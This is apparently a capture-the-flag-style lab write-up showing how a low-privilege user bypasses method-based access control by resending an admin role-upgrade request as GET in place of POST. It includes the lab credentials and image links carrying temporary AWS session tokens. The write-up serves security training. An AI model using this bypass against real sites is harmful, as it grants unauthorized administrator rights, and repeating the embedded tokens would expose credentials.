# Method-based access control can be circumvented

### Target Goal - 

Log in using the credentials `wiener:peter` and exploit the flawed access controls to promote yourself to become an administrator

### Analysis/Exploitation -

<details><summary>Summary</summary>

We can see this request with administrator user.

```text
POST /admin-roles HTTP/1.1
...
username=carlos&action=upgrade

```

```text

POST /admin-roles - HTTP/1.1   -->401 Unauthorized
GET /admin - HTTP/1.1   -->400 Missing parameter'username'
```

With non privileged user, we  get 401 Unauthorized error.

But we can bypass the error with another type of request instead of using POST.

```text
GET /admin-roles?username=wiener&action=upgrade HTTP/1.1 --> 302 Found
GET /admin --> 200 OK
```

</details>

familiarize yourself with the admin panel by logging in using the credentials `administrator:admin` 

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/3fea78d0-0b43-4ccf-a7b7-0409c6c0b92b/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466UBRF3EH5%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T210354Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOT%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDkBHmJ6YMNKetI7YFxR0WYe2mVZB%2BHLCpB9y48mxO0LgIgOUJhfleJ234YtC8qrlXFlYwDeP01SQ1g0JvujKouHcsqiAQIrP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDHcHSwPk%2Ft3IIb2nGircAxMZn1qq5JW7Tkjtmu6vlfTSW86MYGMAvVB5zywkYgKFV5kULExLmNYEqG6%2Fh7SDyoS7oB6IOREDFaeOToon%2BQTPuS9TFCAOUgTKMeGfXQk2nF1Wqm9iGq2g%2BKPodFomSm6DnkuQQ6kXA8VEaQDkbuSM2nQ8eZjW4hH8fD5WPkwwRINmlj5dquS%2BAYsqvgvERNOojU7S9vAW9uR67vhiQFCyIxMFFPNKk74JL5NgTCFLdTwbFWFttuFl5I07EUxJdskf3lYxI8iBsJ8pSngMGjvbDwqdg3dfuC69XPvpx9beilAIAGHAkyHp80VMyZidvlLqyvMO5kBJKgJ9b02Xe2cmN%2BH0gZ%2BPJArK4kVwwY2Xyl%2F%2Bpi5T22MTukYgLkpN4rwzhFvksOOsk1luDOYBJB2XgsAKubhXV60BHn%2BvJ9uzolw6Ez4SijvjdWDSMja4HAIF6k7CxhvwBDSFrYIM5qRrTTEZHwALYg8wh3enTMnfy5TSnTVtn0Te%2BUG4%2BtlAbEXFr48XfmyOnykv%2FdjDEEK2x%2BJNfziAe0FXkTLEZT0AGSCqO1kh0omRcTN9QU6w2Cg4eo4cqqMBqgsoTpMMp1n%2B5A1MHv6SkQKTYxlNNn7fj%2BPUnUiLXsotXs7AMIjJotQGOqUBbxm9nKNurt%2F54%2B7AoC%2BMwpoLSHaKQPW6nbmzrBaOeYfDw5hpeuv2uxPyD0cBmzw4PYxq4QMvnZmoyp596qFVamK%2BtS9FKMuF23qcX9Wha0mOGOckyKT%2FNdAfmLnHX2%2Bd3MTeGMNvsXDWhE%2BwU%2B2c793sCoUmff8L1gogqBD6lj6k12AOFCrThurOaeqBcCevOkRIQquqyTHGeQEwcpQ182QOh5yI&X-Amz-Signature=ba4a8f1c311de2cf2c8026d37c454cbb270ab562b611bcc06f2299e912451557&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

Here, administrator can upgrade or downgrade a user.

When we try to upgrade a user:

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/bf966fe2-5feb-4e1c-a3a5-452eb29a929e/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466UBRF3EH5%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T210354Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOT%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDkBHmJ6YMNKetI7YFxR0WYe2mVZB%2BHLCpB9y48mxO0LgIgOUJhfleJ234YtC8qrlXFlYwDeP01SQ1g0JvujKouHcsqiAQIrP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDHcHSwPk%2Ft3IIb2nGircAxMZn1qq5JW7Tkjtmu6vlfTSW86MYGMAvVB5zywkYgKFV5kULExLmNYEqG6%2Fh7SDyoS7oB6IOREDFaeOToon%2BQTPuS9TFCAOUgTKMeGfXQk2nF1Wqm9iGq2g%2BKPodFomSm6DnkuQQ6kXA8VEaQDkbuSM2nQ8eZjW4hH8fD5WPkwwRINmlj5dquS%2BAYsqvgvERNOojU7S9vAW9uR67vhiQFCyIxMFFPNKk74JL5NgTCFLdTwbFWFttuFl5I07EUxJdskf3lYxI8iBsJ8pSngMGjvbDwqdg3dfuC69XPvpx9beilAIAGHAkyHp80VMyZidvlLqyvMO5kBJKgJ9b02Xe2cmN%2BH0gZ%2BPJArK4kVwwY2Xyl%2F%2Bpi5T22MTukYgLkpN4rwzhFvksOOsk1luDOYBJB2XgsAKubhXV60BHn%2BvJ9uzolw6Ez4SijvjdWDSMja4HAIF6k7CxhvwBDSFrYIM5qRrTTEZHwALYg8wh3enTMnfy5TSnTVtn0Te%2BUG4%2BtlAbEXFr48XfmyOnykv%2FdjDEEK2x%2BJNfziAe0FXkTLEZT0AGSCqO1kh0omRcTN9QU6w2Cg4eo4cqqMBqgsoTpMMp1n%2B5A1MHv6SkQKTYxlNNn7fj%2BPUnUiLXsotXs7AMIjJotQGOqUBbxm9nKNurt%2F54%2B7AoC%2BMwpoLSHaKQPW6nbmzrBaOeYfDw5hpeuv2uxPyD0cBmzw4PYxq4QMvnZmoyp596qFVamK%2BtS9FKMuF23qcX9Wha0mOGOckyKT%2FNdAfmLnHX2%2Bd3MTeGMNvsXDWhE%2BwU%2B2c793sCoUmff8L1gogqBD6lj6k12AOFCrThurOaeqBcCevOkRIQquqyTHGeQEwcpQ182QOh5yI&X-Amz-Signature=b5a782da6c8b73858a2d21c0c015283d3cb76b9badbbe10c70c508c76aa47716&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

**It’s sending a POST request to **`/admin-roles`**, and with the **`username`** and **`action`**.**

Now, let’s log out and login as user `wiener` to do vertical privilege escalation!

After login send any GET request to repeater and change the ** **location to** **`/admin-roles`

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/db04fb1e-ff4c-44b9-9f91-323f66a393fd/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466UBRF3EH5%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T210354Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOT%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDkBHmJ6YMNKetI7YFxR0WYe2mVZB%2BHLCpB9y48mxO0LgIgOUJhfleJ234YtC8qrlXFlYwDeP01SQ1g0JvujKouHcsqiAQIrP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDHcHSwPk%2Ft3IIb2nGircAxMZn1qq5JW7Tkjtmu6vlfTSW86MYGMAvVB5zywkYgKFV5kULExLmNYEqG6%2Fh7SDyoS7oB6IOREDFaeOToon%2BQTPuS9TFCAOUgTKMeGfXQk2nF1Wqm9iGq2g%2BKPodFomSm6DnkuQQ6kXA8VEaQDkbuSM2nQ8eZjW4hH8fD5WPkwwRINmlj5dquS%2BAYsqvgvERNOojU7S9vAW9uR67vhiQFCyIxMFFPNKk74JL5NgTCFLdTwbFWFttuFl5I07EUxJdskf3lYxI8iBsJ8pSngMGjvbDwqdg3dfuC69XPvpx9beilAIAGHAkyHp80VMyZidvlLqyvMO5kBJKgJ9b02Xe2cmN%2BH0gZ%2BPJArK4kVwwY2Xyl%2F%2Bpi5T22MTukYgLkpN4rwzhFvksOOsk1luDOYBJB2XgsAKubhXV60BHn%2BvJ9uzolw6Ez4SijvjdWDSMja4HAIF6k7CxhvwBDSFrYIM5qRrTTEZHwALYg8wh3enTMnfy5TSnTVtn0Te%2BUG4%2BtlAbEXFr48XfmyOnykv%2FdjDEEK2x%2BJNfziAe0FXkTLEZT0AGSCqO1kh0omRcTN9QU6w2Cg4eo4cqqMBqgsoTpMMp1n%2B5A1MHv6SkQKTYxlNNn7fj%2BPUnUiLXsotXs7AMIjJotQGOqUBbxm9nKNurt%2F54%2B7AoC%2BMwpoLSHaKQPW6nbmzrBaOeYfDw5hpeuv2uxPyD0cBmzw4PYxq4QMvnZmoyp596qFVamK%2BtS9FKMuF23qcX9Wha0mOGOckyKT%2FNdAfmLnHX2%2Bd3MTeGMNvsXDWhE%2BwU%2B2c793sCoUmff8L1gogqBD6lj6k12AOFCrThurOaeqBcCevOkRIQquqyTHGeQEwcpQ182QOh5yI&X-Amz-Signature=6997587f17ea95cd12bef925469a9546c2e7c491c73392971e85367d9ee488f7&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

As you can see, looks like we can access `/admin-roles` when we’re sending a GET request to `/admin-roles` without any parameters.

If we change it to POST method we  get 401 Unauthorized . **So we’re allowed to send a GET request to **`/admin-roles`


![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/0d60d2ee-8640-49ac-b6b5-46faa4aa89f6/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466YPSBFOJP%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T210355Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCUth1yYnOetsWIoBQPo0W4TvYqQweXSHaD%2FgLA2fJafgIhANSFP92h2TM2UjRBTzy5kGffDy%2B7a33D32rCb%2FRaKyztKogECKz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1Igw%2Bk2dl4ejqzV17QCoq3APApLBPSCYeEpyoenMlKQAoGqLyd%2BBRK5TRvyZOotmxXHdIJJvvlGTFJ%2FrklBFO%2F%2FYYvG7LgRBdgMVXFtsZQJsPgrCC%2B96YtzjrUGIkEei3i%2Bii%2Fm2E%2FSrJqAnsSOBSK3nizqOB3jBgEg9EPf1WqN6T2k2Xo6Ci6c7yuUFJ7DsjotnFhWDDD47MfatTK9BCS3OX9lvWrZ9pXlEZAA8PSkgvAWysCJ9Ik03FQCKP%2FcU7%2BlfMeR3l0SM0LZHHoQSmGZP4utOmqlSQMAdR2yOgoJXhiX1FTTIYn7Uguk5MfIOLXWDbLCXQ2o0Xcy6narqzcgMOPAGotlvB16XR0lf3PkJz3dFtNbb%2FN1lMjeCWrSLM4axa9msqdo6Mvrz1VddP7pgPvUgCag1VePYV%2FHgr%2FLeknbm5ESFQog%2BIaBM240dh9snoeoYepA8BMB55fFRm6khHpK6uSnpZ%2Fy%2FdB0Jni90S9U8AhPf3gCrNSUI4wvpfjPejgXScW7ft8sV5nRoJSamLEy0Yo1A42SCygiayWeDC9F%2FlsraDXoLtJoosPWEZ1pG8uzLMTVVMSI%2FsK49C%2B2u2n69PZj7YYC5M1crs3NX%2FcJNsHH3TwnJpb3JBm85w%2Bhj4jk3ttNRJftyV1zDLyKLUBjqkAYcWPiGCncrMra637He6mptKht5AlLDVClhFaTVys4G0tqNEMg6fAeAAscLrpgX5ph9n%2Bw1LbQmgj%2FQ9e%2F7zczdH1vMqj7uZhu7cxpeJS9CDMoNhdm1Cc9opL23brkl5R8QsV0y66LGcenxVPM3ennj71FAn%2B9FZ9P20eMhJaSl%2BYD%2BS65upu6Ge1%2BtKO1vRFW0uq%2Fj1hPGWai4lXaPy8E2VAA8r&X-Amz-Signature=f9e5e52989df045e66fb6526d39fd8827cbff997022fd536cc7a8bdcc6db0ef1&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)


**send a GET request to **`/admin-roles`**, with parameters: **`username=wiener&action=upgrade`**:**

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/6012c499-f073-4ec4-873a-0494ba2fd88f/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466UBRF3EH5%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T210354Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOT%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDkBHmJ6YMNKetI7YFxR0WYe2mVZB%2BHLCpB9y48mxO0LgIgOUJhfleJ234YtC8qrlXFlYwDeP01SQ1g0JvujKouHcsqiAQIrP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDHcHSwPk%2Ft3IIb2nGircAxMZn1qq5JW7Tkjtmu6vlfTSW86MYGMAvVB5zywkYgKFV5kULExLmNYEqG6%2Fh7SDyoS7oB6IOREDFaeOToon%2BQTPuS9TFCAOUgTKMeGfXQk2nF1Wqm9iGq2g%2BKPodFomSm6DnkuQQ6kXA8VEaQDkbuSM2nQ8eZjW4hH8fD5WPkwwRINmlj5dquS%2BAYsqvgvERNOojU7S9vAW9uR67vhiQFCyIxMFFPNKk74JL5NgTCFLdTwbFWFttuFl5I07EUxJdskf3lYxI8iBsJ8pSngMGjvbDwqdg3dfuC69XPvpx9beilAIAGHAkyHp80VMyZidvlLqyvMO5kBJKgJ9b02Xe2cmN%2BH0gZ%2BPJArK4kVwwY2Xyl%2F%2Bpi5T22MTukYgLkpN4rwzhFvksOOsk1luDOYBJB2XgsAKubhXV60BHn%2BvJ9uzolw6Ez4SijvjdWDSMja4HAIF6k7CxhvwBDSFrYIM5qRrTTEZHwALYg8wh3enTMnfy5TSnTVtn0Te%2BUG4%2BtlAbEXFr48XfmyOnykv%2FdjDEEK2x%2BJNfziAe0FXkTLEZT0AGSCqO1kh0omRcTN9QU6w2Cg4eo4cqqMBqgsoTpMMp1n%2B5A1MHv6SkQKTYxlNNn7fj%2BPUnUiLXsotXs7AMIjJotQGOqUBbxm9nKNurt%2F54%2B7AoC%2BMwpoLSHaKQPW6nbmzrBaOeYfDw5hpeuv2uxPyD0cBmzw4PYxq4QMvnZmoyp596qFVamK%2BtS9FKMuF23qcX9Wha0mOGOckyKT%2FNdAfmLnHX2%2Bd3MTeGMNvsXDWhE%2BwU%2B2c793sCoUmff8L1gogqBD6lj6k12AOFCrThurOaeqBcCevOkRIQquqyTHGeQEwcpQ182QOh5yI&X-Amz-Signature=bd2f3bbe5d8c51029389a4b3af011486d2d0a019d6477cff55cdeea15c81303a&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

